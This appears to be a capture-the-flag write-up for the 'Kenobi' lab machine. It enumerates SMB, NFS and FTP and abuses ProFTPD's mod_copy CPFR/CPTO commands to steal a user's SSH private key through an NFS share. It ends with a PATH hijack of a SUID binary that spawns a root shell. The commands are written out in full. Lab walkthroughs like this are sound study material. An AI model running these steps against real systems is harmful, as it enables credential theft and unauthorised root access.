# Kenobi

{% hint style="info" %}
A basic NFS, FTP and SMB machine. exploiting all of those will lead to an  RCE from which we can <mark style="color:red;">**manipulate a user's ssh key**</mark>.

Then for PrivEsc we will be redirecting the curl command in a binary with SUID bit enabled to spawn a shell for us using the <mark style="color:red;">**$PATH**</mark> variable. Same technique used [here ](wonderland.md)for lateral movement.
{% endhint %}

## Enumeration

### Nmap

```bash
$nmap <target-ip> -sV -sC -T4 -Pn -vv -oN kenobi-def-scan
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

I often jump to enumerating the FTP portal, but it lead to nothing so i went on to SMB.

### SMB

```bash
$nmap <target-ip> -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse -T4 -Pn -vv -oN kenobi-smb-scan
```

Which leads to 3 SMB shares available:

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Which is also confirmed with :&#x20;

```bash
$smbclient -L <target-ip>
```

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

So we try to connect to it:&#x20;

```bash
$smbclient //<target-ip>/anonymous
```

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
After much struggle, it turns out that I had a problem with my internet connection. Upon changing my router everything went flawless and the download was successful.
{% endhint %}

Now reading the logs we find this:&#x20;

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Okay the ssh keys of the user kenobi are stored in <mark style="color:purple;">/home/kenobi/.ssh/id\_rsa</mark> file.

Now we move on there's nothing else helpful in that log file.

### NFS

```
$nmap <target-ip> -p 111,2049 --script=nfs* 
```

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

### FTP

Okay now we go back to the FTP server. Banner grabbing show us the version :&#x20;

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Okay let's look for an exploit:

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Okay it's all about this mod\_copy thing.&#x20;

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Okay this exploit description is pretty self explanatory. We will aim at mounting whatever we want to a specific place we want .&#x20;

* So what do we have? the ssh key file of the kenobi user.&#x20;
* Where should we put it? In the NFS mounting directory.

Here we go.

## Foothold

So we will be using the CPFR (copy from) and CPTO (copy to) commands with the FTP server to put the <mark style="color:green;">/home/kenobi/.ssh/id\_rsa</mark> file in <mark style="color:red;">/var.</mark>

{% hint style="success" %}
It is always a good practice to copy it to the temporary directory just to keep the machine clean for other players.
{% endhint %}

```bash
$nc <target-ip> 21
<...>
SITE CPFR /home/kenobi/.ssh/id_rsa
<...>
SITE CPTO /var/tmp/id_rsa
<...>
```

```bash
$mkdir target-NFS
$sudo mount -t nfs <taget-ip>:/var ./target-NFS/ -o nolock
$cd target-NFS
```

Now we just connect to the target as kenobi using that key :smile:

```bash
$cp tmp/id_rsa /home/<user>/thm/kenobi                                                                  
$sudo chmod 600 id_rsa  

#Do not forget to unmount the NFS  
$sudo umount target-NFS    
                              
$ssh -i id_rsa kenobi@<target-ip>
```

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

## Priv Esc

{% hint style="warning" %}
This was the same technique we used on [Wonderland ](wonderland.md)machine to pivot from a user to another.
{% endhint %}

For priv esc, without directly going into automated scripts, we should look for some low hanging fruits. sudo -l gave un nill, we pass on to SUID/GUID bits.

```bash
$find / -perm -u=s -type f 2>/dev/null
```

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Okay a binary called menu, that's something. Let's run it&#x20;

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Okay the status check option could lead to something, if it probes the website using a vulnerable command or anything of that sort, we could take advantage of that. Let's do some static analysis on this file (basic CTF RE/pwn scenario)

```bash
$strings /usr/bin/menu
```

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Yeah well, executing curl, but WHICH curl ? :smile: if we change the $PATH variable to something of our choice instead of that curl command, it will execute ours.

```bash
kenobi@kenobi:~$ echo /bin/sh > /tmp/curl
kenobi@kenobi:~$ chmod +x /tmp/curl 
kenobi@kenobi:~$ export PATH=/tmp:$PATH
kenobi@kenobi:~$ /usr/bin/menu 
```

<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
